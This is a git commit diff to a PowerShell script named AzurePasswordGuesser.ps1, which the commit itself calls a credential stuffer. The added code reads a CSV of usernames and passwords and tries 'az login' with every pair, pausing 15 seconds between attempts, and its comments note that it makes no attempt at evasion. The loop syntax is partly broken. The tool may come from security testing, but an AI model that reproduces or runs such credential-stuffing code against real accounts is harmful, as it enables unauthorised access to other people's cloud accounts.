666551da00161fc9bbc443ca1520931b57c78e60
Zoe <70719914+zcheuvront@users.noreply.github.com>
2022-12-22 10:56:06 -0800

    Added cred stuffer and comments

--- Security/AzurePasswordGuesser.ps1
+++ Security/AzurePasswordGuesser.ps1
@@ -1,6 +1,12 @@
-# Azure password guesser. Takes in a CSV with a username and password column and makes azure login attempts using the credentials provided
-# This is very basic and doesn't take into account evasion tactics 
+# Azure password guesser. Takes in a CSV with a username and password column 
+# and makes azure login attempts using the credentials provided with a 15-second delay each iteration
+# This is very basic and doesn't take into account evasion tactics
 
+# CSV should look as follows:
+# |		username	| 	password	|
+# |		exampleuser |	LetMeIn123! |
+
+# Needs to be run from elevated Powershell prompt
 # Example Usage: > AzurePasswordGuesser.ps1 -path C:\users\public\creds.csv
 #Requires -RunAsAdministrator
 
@@ -20,15 +26,18 @@ param(
         })]
         [System.IO.FileInfo]$path
 )
+$csv = import-csv $path
 
 Get-Module | ForEach-Object{
-    if($_.Name -eq "PSReadLine"){
-        
-    }
+    if($_.Name -eq "Azure"){
+		foreach{$username in $csv.username
+			foreach($password in $csv.password){
+				az login -u $username -p $password
+				start-sleep -Seconds 15
+			}
+		}
+	}
     else{
         Write-Host -f Red "The Azure PowerShell module is missing. Please install with 'install-module azure'"
     }
 }
-
-
-$creds = Import-Csv $path
